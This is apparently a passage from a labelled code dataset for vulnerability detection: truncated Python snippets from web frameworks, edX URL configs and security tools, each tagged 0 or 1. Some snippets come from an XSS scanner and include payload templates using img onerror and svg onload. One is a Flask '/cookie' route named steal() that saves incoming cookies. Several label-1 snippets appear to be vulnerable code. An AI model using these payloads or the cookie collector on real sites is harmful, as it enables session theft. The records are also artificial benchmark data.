\"url\": url}) except: print \"Failed to update DB\" else: msg={\"status\": \"Failed\"} except: msg={\"status\": \"Failed\"} return jsonify(msg) @app.route('/scan/scanids/', methods=['GET']", "label": 0}, {"snippet_id": 41219, "code": "(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local.form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title", "label": 0}, {"snippet_id": 2758, "code": " uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload", "label": 0}, {"snippet_id": 38032, "code": "\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext", "label": 0}, {"snippet_id": 32948, "code": ", d, d)) break self.wfile.write('</div>') self._WriteTemplate('footer.html') def _DoImage(self, full_path, mime_type): self._WriteHeader(mime_type) with open(full_path) as f: self.wfile.write(f.read())", "label": 1}, {"snippet_id": 9091, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"", "label": 0}, {"snippet_id": 6037, "code": " None, 'syslog_socket': None, 'listen_addr': '0.0.0.0', 'listen_port': '8088', 'pysaml2_config': 'idp_conf.py', 'fticks_secret_key': None, 'fticks_format_string': 'F-TICKS/SWAMID/2.0 'static_dir': None", "label": 0}, {"snippet_id": 44560, "code": " workflow_doc=Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user) Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name", "label": 0}, {"snippet_id": 19157, "code": "' \" \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \" \"VERIFY_XSS='{verify_xss}' \" \"nosetests{repo_dir}/common/test/acceptance/{exp_text} \" \"--with-xunit \" \"--xunit-file={repo_dir}/reports", "label": 0}, {"snippet_id": 45614, "code": " @check_document_modify_permission() def save_bundle(request): response={'status': -1} bundle_data=json.loads(request.POST.get('bundle', '{}')) if bundle_data.get('id'): bundle_doc=Document2.objects.get(id=bundle_data['id']) else:", "label": 0}, {"snippet_id": 39769, "code": " self.meta.get_fields_to_fetch(df.fieldname) \t\t\t\t\tif \t\t\t\t\t\tnot _df.get('fetch_if_empty') \t\t\t\t\t\tor(_df.get('fetch_if_empty') and not self.get(_df.fieldname)) \t\t\t\t] \t\t\t\tif not fields_to_fetch: \t\t\t\t\t \t\t\t\t", "label": 0}, {"snippet_id": 49211, "code": ".get_url_with_query_params({ self.ordering_query_param: \".\".join(new_query) }) def get_reverse_sort_by(self): new_query=[] for column in self.query_order.split('.'): c=column.replace(\"-\", \"\") if int(c)==self.column_id", "label": 0}, {"snippet_id": 13088, "code": " url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'),", "label": 0}, {"snippet_id": 28933, "code": "\t\tsftp.close() \t\tssh.close() \texcept Exception as e: \t\tssh=str(e) \t\treturn ssh \t def diff_config(oldcfg, cfg): \tlog_path=get_config_var('main', 'log_path') \tdiff=\"\" \tdate=get_data('date_in_log') \tcmd=\"", "label": 0}, {"snippet_id": 46024, "code": ".GET.get('collection') if not hue_collections or not collection_id: return admin_collections(request, True, is_mobile) try: collection_doc=Document2.objects.get(id=collection_id) if USE_NEW_EDITOR.get(", "label": 0}, {"snippet_id": 9513, "code": "?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views", "label": 0}, {"snippet_id": 1337, "code": "'req_body']=\"NA\" data.pop('_id') try: data= ast.literal_eval(json.dumps(data)) except: print \"Falied to parse\" print \"Data\",data try: if data['id']==\"NA\": all_data={'url': data['url'], 'impact': data['impact']", "label": 0}, {"snippet_id": 25596, "code": ") super().__init__(*args, **kwargs) if item.admission and event.settings.attendee_names_asked: self.fields['attendee_name_parts']=NamePartsFormField( max_length=255, required=event.settings.attendee_names_required", "label": 0}, {"snippet_id": 36361, "code": "\treturn fieldname in doc.format_data_map \t\telse: \t\t\treturn True \tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields): \t\t\"\"\"If the user does not have permissions at permlevel", "label": 0}, {"snippet_id": 54429, "code": " sticky=W, pady=4) Button(main, text='Scan', command=scan).grid(row=11, column=4, sticky=W, pady=4) Label(main, text=\"\\n\\nCoder: Ala Bouali\\nGithub: https://github.com/AlaBouali\\nE-mail: trap.leader.123@gmail", "label": 0}, {"snippet_id": 37168, "code": ": \t\t\tpost.comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post", "label": 0}, {"snippet_id": 10777, "code": " self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes", "label": 0}, {"snippet_id": 53922, "code": " @app.route('/cookie',methods=['GET','POST']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: ", "label": 0}, {"snippet_id": 41835, "code": "=_filter(self.__dict__.get(key,[]), filters, limit=limit) \t\t\t\telse: \t\t\t\t\tdefault=filters \t\t\t\t\tfilters=None \t\t\t\t\tvalue=self.__dict__.get(key, default) \t\t\telse: \t\t\t\tvalue=self.__dict__.get(key, default) \t\t", "label": 0}, {"snippet_id": 48070, "code": " +'/LOWRES_' +ntpath.basename(file.name.replace(\" \", \"_\")) if not os.path.exists(PATH_TO_UPLOAD_FOLDER_ON_DISK +upload_base_path): os.makedirs(PATH_TO_UPLOAD_FOLDER_ON_DISK +upload_base_path) with open", "label": 0}, {"snippet_id": 6004, "code": " SAML frontend IdP\", long_description=README, classifiers=[ ], keywords='eduID SAML', author='Fredrik Thulin', author_email='fredrik@thulin.net', license='BSD', packages=['eduid_idp',], package_dir={'': ", "label": 0}, {"snippet_id": 43602, "code": "=frappe._dict() \t\tif fieldname not in self._precision[cache_key]: \t\t\tself._precision[cache_key][fieldname]=None \t\t\tdoctype=self.meta.get_field(parentfield).options if parentfield else self.doctype \t\t\tdf", "label": 0}, {"snippet_id": 47054, "code": " db from markupsafe import Markup from sqlalchemy.exc import SQLAlchemyError from.api import Record from.models import RecordMetadata class RecordMetadataModelView(ModelView): \"\"\"Records admin model view", "label": 0}, {"snippet_id": 20723, "code": ".login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account',", "label": 0}, {"snippet_id": 9096, "code": ")/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/", "label": 1}, {"snippet_id": 44467, "code": "'-copy' copy_doc=doc2.doc.get().copy(name=name, owner=request.user) doc2.pk=None doc2.id=None doc2.uuid=str(uuid.uuid4()) doc2.name=name doc2.owner=request.user doc2.save() doc2.doc.all().delete() doc2", "label": 0}, {"snippet_id": 42801, "code": "\tif self.parentfield: \t\t\t\treturn \"{} \t\t\telse: \t\t\t\treturn \"{}:{}\".format(_(df.label), docname) \t\tinvalid_links=[] \t\tcancelled_links=[] \t\tfor df in(self.meta.get_link_fields() \t\t\t\t+self.meta.get(\"fields\",{", "label": 0}, {"snippet_id": 42656, "code": ".get(df.fieldname) is not None: \t\t\t\tif df.fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\t\telif df.fieldtype in(\"Float\", \"Currency\", \"Percent\"): \t\t\t\t\tself.set(df.fieldname", "label": 0}, {"snippet_id": 33130, "code": " expiration import model import notifications import service import swarming import user README_MD=( 'https://chromium.googlesource.com/infra/infra/+/master/' 'appengine/cr-buildbucket/README.md' ) class", "label": 0}, {"snippet_id": 49643, "code": " name of the field(string) or 2. two element iterable in which: -first element is name of the field(string) or callable which returns html -label for the column(string) \"\"\" if not self.list_display: return", "label": 0}, {"snippet_id": 38318, "code": ".blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t", "label": 0}, {"snippet_id": 47747, "code": ") def action_save_user(request: HttpRequest, default_forward_url: str=\"/admin/users\"): \"\"\" This functions saves the changes to the user or adds a new one. It completely creates the HttpResponse :param request", "label": 0}, {"snippet_id": 31551, "code": "} \t\t\tmetrics[rep_date]['conn']=str(i[1]) \t\tdf=pd.DataFrame.from_dict(metrics, orient=\"index\") \t\tdf=df.fillna(0) \t\tdf.index=pd.to_datetime(df.index) \t\tdf.index.name='Date' \t\tdf.sort_index(inplace=True) ", "label": 0}, {"snippet_id": 14634, "code": ".shard if self.shard else '', exp_text=name, a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js', verify_xss=verify_xss ) return expected_statement def setUp(self): super(TestPaverBokChoyCmd", "label": 0}, {"snippet_id": 15724, "code": "\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This method composes the nosetests command to send to the terminal. If", "label": 0}, {"snippet_id": 30044, "code": " \t\tprint('<div class=\"alert alert-danger\">Can\\'t save ssl keys file. Check ssh keys path in config</div>') \telse: \t\tprint('<div class=\"alert alert-success\">SSL file was upload to %s into: %s </div>' %(serv", "label": 0}, {"snippet_id": 54920, "code": " of TranslatedResource. \"\"\" projects=set() for translated_resource in translated_resources: projects.add(translated_resource.resource.project) translated_resource.calculate_stats(save=False) bulk_update", "label": 0}, {"snippet_id": 34481, "code": " not self.__dict__.get(key): \t\t\t\tself.__dict__[key]=[] \t\t\tvalue=self._init_child(value, key) \t\t\tself.__dict__[key].append(value) \t\t\t \t\t\tvalue.parent_doc=self \t\t\treturn value \t\telse: \t\t\t \t\t\t \t\t\tif(getattr", "label": 0}, {"snippet_id": 32199, "code": " import codecs import os import re import socket import sys import threading import time import webbrowser from xml.etree import ElementTree THIS_DIR=os.path.realpath(os.path.dirname(__file__)) SRC_DIR", "label": 0}, {"snippet_id": 50330, "code": "'csessid': csessid}) def mode_keepalive(self, request): \"\"\" This is called by render_POST when the client is replying to the keepalive. \"\"\" csessid=request.args.get('csessid')[0] self.last_alive[csessid", "label": 0}, {"snippet_id": 36956, "code": " from `tabBlog Category` \t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1)", "label": 0}, {"snippet_id": 52188, "code": ": if request.method !='POST': raise PopupException(_('A POST request is required.')) jobs=json.loads(request.POST.get('selection')) for job in jobs: doc2=Document2.objects.get(id=job['id']) doc=doc2.doc", "label": 0}, {"snippet_id": 39764, "code": "\t\t\tfields_to_fetch=[ \t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname) \t\t\t\t\tif \t\t\t\t\t\tnot _df.get('fetch_if_empty') \t\t\t\t\t\tor(_df.get('fetch_if_empty') and not self.get(_df.fieldname)) \t\t\t\t", "label": 0}, {"snippet_id": 47077, "code": " can_edit=False can_delete=True can_view_details=True column_list=('id', 'version_id', 'updated', 'created',) column_details_list=('id', 'version_id', 'updated', 'created', 'json') column_labels=dict( id", "label": 0}, {"snippet_id": 17383, "code": ".provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth", "label": 0}, {"snippet_id": 2856, "code": "\"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='", "label": 0}, {"snippet_id": 27697, "code": "(self.request.url) values['logout_url']=make_logout_url(dest_url=self.request.url) template=_JINJA_ENVIRONMENT.get_template(path) self._add_security_response_headers() self.response.headers['Content-Type", "label": 0}, {"snippet_id": 42547, "code": "[\"`\"+c+\"`=%s\" for c in columns]) \t\t\t\t), list(d.values()) +[name]) \t\texcept Exception as e: \t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]): \t\t\t\tself.show_unique_validation_message(e) \t\t\telse: ", "label": 0}, {"snippet_id": 29511, "code": "('<div class=\"'+line_class+'\">' +escape_html(line) +'</div>') \t\t\t def show_ip(stdout): \tfor line in stdout: \t\tprint(line) \t\t def server_status(stdout):\t \tproc_count=\"\" \t \tfor line in stdout: \t\tif \"Ncat", "label": 0}, {"snippet_id": 29217, "code": " $2}'\" %(serv, haproxy_sock_port) \toutput, stderr=subprocess_execute(cmd) \tfor line in output: \t\tver=line \treturn ver \t def upload(serv, path, file, **kwargs): \terror=\"\" \tfull_path=path +file \tif kwargs", "label": 0}, {"snippet_id": 11892, "code": " continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key", "label": 0}, {"snippet_id": 34154, "code": ": \t\"\"\"Returns the **class** object of the given DocType. \tFor `custom` type, returns `frappe.model.document.Document`. \t:param doctype: DocType name as string.\"\"\" \tfrom frappe.model.document import Document", "label": 0}, {"snippet_id": 41546, "code": " unicode_literals from six import iteritems, string_types import datetime import frappe, sys from frappe import _ from frappe.utils import(cint, flt, now, cstr, strip_html, \tsanitize_html, sanitize_email,", "label": 0}, {"snippet_id": 44340, "code": "(workflow_data['layout']), 'workflow_json': json.dumps(workflow_data['workflow']), 'credentials_json': json.dumps(credentials.credentials.keys()), 'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES),", "label": 1}, {"snippet_id": 50710, "code": "(any): Options to the protocol \"\"\" self.sessionhandler.data_out(self, **kwargs) def send_text(self, *args, **kwargs): \"\"\" Send text data. This will pre-process the text for color-replacement, conversion", "label": 0}, {"snippet_id": 17285, "code": " url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo", "label": 0}, {"snippet_id": 39854, "code": " values[_df.fetch_from.split('.')[-1]]) \t\t\t\t\tnotify_link_count(doctype, docname) \t\t\t\t\tif not values.name: \t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname))) \t\t\t\t\telif(df.fieldname", "label": 0}, {"snippet_id": 15934, "code": " the test course. \"\"\" self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz' msg=colorize('green', \"Fetching the test course from github...\") print msg sh( 'wget{tar_gz_file", "label": 0}, {"snippet_id": 47962, "code": " HttpRequest, HttpResponseBadRequest from frontpage.models import Profile, Media, MediaUpload from frontpage.management.magic import compile_markdown, get_current_user import logging import ntpath import os", "label": 0}, {"snippet_id": 53298, "code": " properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting coordinator %s\") %(coordinator,), detail=ex._headers.get('oozie-error-message", "label": 0}, {"snippet_id": 9229, "code": "+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware", "label": 1}, {"snippet_id": 5882, "code": " url): return url +'/.well-known/acme-challenge/?<h1>hi' def img(self, payload): return '<img/onerror=\"%s\"/src=x>' % payload def svg(self, payload): return '<svg/onload=\"%s\"/>' % payload def style(self", "label": 1}, {"snippet_id": 6026, "code": "\" import os import ConfigParser _CONFIG_DEFAULTS={'debug': False, 'syslog_debug': '0', 'num_threads': '8', 'logdir': None, 'logfile': None, 'syslog_socket': None, 'listen_addr': '0.0.0.0', 'listen_port", "label": 0}, {"snippet_id": 44713, "code": ".get_docs(user, Document2, extra='workflow2')] ] def add_node(request): response={'status': -1} node=json.loads(request.POST.get('node', '{}')) properties=json.loads(request.POST.get('properties', '{}')", "label": 0}, {"snippet_id": 32145, "code": ".ud.lower()] def get_rules_as_json(mapping): rules=getattr(mapping, 'rules', None) if rules: rules=json.dumps(rules, indent=4) return safestring.mark_safe(rules) class MappingsTable(tables.DataTable): id", "label": 1}, {"snippet_id": 31144, "code": " MASTER \"+interface+\" \"+vrrpip+\" \"+kp]) \tfunct.ssh_command(slave,[\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" BACKUP \"+interface+\" \"+vrrpip+\" \"+kp]) \t\t\t \tos.system(\"rm -f %s\" % script) ", "label": 0}, {"snippet_id": 29715, "code": " \tret=\"\" \tfor line in output: \t\tif \" \t\t\tcontinue \t\tif line !=\"\": \t\t\tback=json.dumps(line).split(\"\\\"\") \t\t\tif kwargs.get('ret'): \t\t\t\tret +=back[1] \t\t\t\tret +=\"<br />\" \t\t\telse: \t\t\t\tprint(back[1], end=\"<br>", "label": 0}, {"snippet_id": 23644, "code": " this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py \"\"\" import os import unittest from mock import patch, call from test.test_support import EnvironmentVarGuard from paver", "label": 0}, {"snippet_id": 28494, "code": "+action +\"\\n\" \t\tlog=open(log_path +\"/checker-\"+get_data('logs')+\".log\", \"a\") \telif kwargs.get('metrics')==1: \t\tmess=get_data('date_in_log') +action +\"\\n\" \t\tlog=open(log_path +\"/metrics-\"+get_data('logs'", "label": 0}, {"snippet_id": 22128, "code": ".conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns", "label": 0}, {"snippet_id": 49027, "code": " __init__(self, smart_list, object): self.smart_list=smart_list self.object=object def fields(self): return[ SmartListField(self, column, self.object) for column in self.smart_list.columns ] class SmartOrder", "label": 0}, {"snippet_id": 13649, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r", "label": 1}, {"snippet_id": 7954, "code": "?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views", "label": 0}, {"snippet_id": 37372, "code": " context.content: \t\t\tcontext.content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype", "label": 0}, {"snippet_id": 43542, "code": "(pwd))=='*' \tdef precision(self, fieldname, parentfield=None): \t\t\"\"\"Returns float precision for a particular field(or get global default). \t\t:param fieldname: Fieldname for which precision is required. \t", "label": 0}, {"snippet_id": 46818, "code": " async def set_content(self, content): return await self.set_props_by_key('content', content) async def save(self, *args, **kwargs): content=kwargs.pop('content', None) if content is not None: await self", "label": 0}, {"snippet_id": 20773, "code": " name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-", "label": 0}, {"snippet_id": 2007, "code": " host_header_xss.text.find(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert", "label": 0}, {"snippet_id": 1936, "code": ":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else:", "label": 0}, {"snippet_id": 9442, "code": "]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems", "label": 0}, {"snippet_id": 3053, "code": " fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip(", "label": 0}, {"snippet_id": 9149, "code": "/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook", "label": 1}, {"snippet_id": 34173, "code": ": DocType name as string.\"\"\" \tfrom frappe.model.document import Document \tglobal _classes \tif not doctype in _classes: \t\tmodule_name, custom=frappe.db.get_value(\"DocType\", doctype,(\"module\", \"custom\"),", "label": 0}, {"snippet_id": 17004, "code": "[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)", "label": 0}, {"snippet_id": 3606, "code": "} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param", "label": 0}, {"snippet_id": 20064, "code": " combination for use with nosetests. \"\"\" substring=[] if self.verbosity !=DEFAULT_VERBOSITY and self.num_processes !=DEFAULT_NUM_PROCESSES: msg='Cannot pass in both num_processors and verbosity. Quitting", "label": 0}, {"snippet_id": 10856, "code": "\"Checking for mongo, memchache, and mysql...\") print msg bokchoy_utils.check_services() if not self.testsonly: self.prepare_bokchoy_run() else: self.load_data() msg=colorize('green', \"Confirming servers have", "label": 0}, {"snippet_id": 54315, "code": ") user_agent.current(1) global payload payload=ttk.Combobox(main, values=pl) payload.current(0) global proxy proxy=ttk.Combobox(main, values=prox) global refresh refresh=ttk.Combobox(main, values=[\"On\"", "label": 0}, {"snippet_id": 14760, "code": "', default_store='invalid') name='tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite('', serversonly=True) self.assertEqual", "label": 0}, {"snippet_id": 28854, "code": "\t\tpass \texcept paramiko.SSHException as sshException: \t\treturn 'Unable to establish SSH connection: %s ' % sshException \t\tpass \texcept paramiko.BadHostKeyException as badHostKeyException: \t\treturn 'Unable", "label": 0}, {"snippet_id": 28570, "code": ". Please check log_path in config %e</div></center>' % e) \t\tpass \t def telegram_send_mess(mess, **kwargs): \timport telebot \tfrom telebot import apihelper \timport sql \t \ttelegrams=sql.get_telegram_by_ip", "label": 0}, {"snippet_id": 48350, "code": "\"srid\" in request.GET: ar.SRID=SubReservation.objects.get(id=int(request.GET[\"srid\"])) ar.amount=quantity ar.notes=notes ar.save() else: if \"group_id\" not in request.GET: return HttpResponseRedirect(\"/admin", "label": 0}, {"snippet_id": 9405, "code": "]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$", "label": 0}, {"snippet_id": 47551, "code": ") f.add_content(NumberField(name='allowed_reservations', button_text=str(profile.number_of_allowed_reservations), minimum=0)) f.add_content(PlainText(\"Rights: \")) f.add_content(NumberField(name=\"rights", "label": 0}, {"snippet_id": 5086, "code": "&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;\" />', ] class XSS(Fuzzer): \"\"\"generate XSS payload\"\"\" tags=_tags events=_events htmlTemplate=_htmlTemplate probes=_probes payloads=_payloads waf_payloads", "label": 0}, {"snippet_id": 13782, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+", "label": 1}, {"snippet_id": 50500, "code": "('csessid')[0] try: sess=self.sessionhandler.sessions_from_csessid(csessid)[0] sess.sessionhandler.disconnect(sess) except IndexError: self.client_disconnect(csessid) return '\"\"' def render_POST(self, request", "label": 0}, {"snippet_id": 18618, "code": "\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+", "label": 0}, {"snippet_id": 35773, "code": " max_length: \t\t\t\t\tif self.parentfield and self.idx: \t\t\t\t\t\treference=_(\"{0}, Row{1}\").format(_(self.doctype), self.idx) \t\t\t\t\telse: \t\t\t\t\t\treference=\"{0}{1}\".format(_(self.doctype), self.name) \t\t\t\t\tfrappe.throw", "label": 0}, {"snippet_id": 2443, "code": " f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): print \"response header\",res_headers['Content-Type'] if res_headers['Content-Type']:", "label": 0}, {"snippet_id": 13372, "code": "', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views", "label": 0}, {"snippet_id": 30644, "code": "':'+minut \tdate1=hour1+':'+minut1 \t \tif grep is not None: \t\tgrep_act ='|grep' \telse: \t\tgrep_act='' \t\tgrep='' \tcmd=\"cat %s| awk '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s %s %s\" %(log_path +viewlog, date,", "label": 0}, {"snippet_id": 35260, "code": "\t\telif self.parentfield: \t\t\t\treturn \"{}:{}{} \t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label)) \t\t\telse: \t\t\t\treturn _(\"Error: Value missing for{0}:{1}\").format(_(df.parent), _(df.label)) \t\tmissing", "label": 0}, {"snippet_id": 15180, "code": "=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests Properties(below is a subset): test_dir -parent directory for tests log_dir -directory for test output", "label": 0}, {"snippet_id": 43310, "code": "\t\t\t\telse: \t\t\t\t\tself_value=self.get_value(key) \t\t\t\tif self_value !=db_value: \t\t\t\t\tfrappe.throw(_(\"Not allowed to change{0} after submission\").format(df.label), \t\t\t\t\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content", "label": 0}, {"snippet_id": 854, "code": "='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): if", "label": 1}, {"snippet_id": 15474, "code": " msg=colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.') print msg else: msg=colorize('green', \"Cleaning up databases...\") print msg sh(\"./manage.py lms --settings bok_choy flush ", "label": 0}, {"snippet_id": 41941, "code": "] \t\t\tvalue=self._init_child(value, key) \t\t\tself.__dict__[key].append(value) \t\t\t \t\t\tvalue.parent_doc=self \t\t\treturn value \t\telse: \t\t\t \t\t\t \t\t\tif(getattr(self, '_metaclass', None) \t\t\t\tor self.__class__.__name__", "label": 0}, {"snippet_id": 20611, "code": "'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard", "label": 0}, {"snippet_id": 47516, "code": "'email', button_text=str(profile.authuser.email))) f.add_content(PlainText(\"Display name: \")) f.add_content(TextField(name='display_name', button_text=profile.displayName)) f.add_content(PlainText('DECT:", "label": 0}, {"snippet_id": 4264, "code": ",{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to XSS\"}}) def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url", "label": 0}, {"snippet_id": 12680, "code": "\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware", "label": 0}, {"snippet_id": 34115, "code": " import default_fields from frappe.model.naming import set_new_name from frappe.model.utils.link_count import notify_link_count from frappe.modules import load_doctype_module from frappe.model import display_fieldtypes", "label": 0}, {"snippet_id": 32982, "code": ": relative_to=self.server.top_level assert not relpath.startswith(os.sep) path=os.path.join(relative_to, relpath) with codecs.open(path, encoding='utf-8') as fp: return fp.read() def _WriteHeader(self,", "label": 0}, {"snippet_id": 10991, "code": "={}\".format(self.xunit_report), \"--verbosity={}\".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If 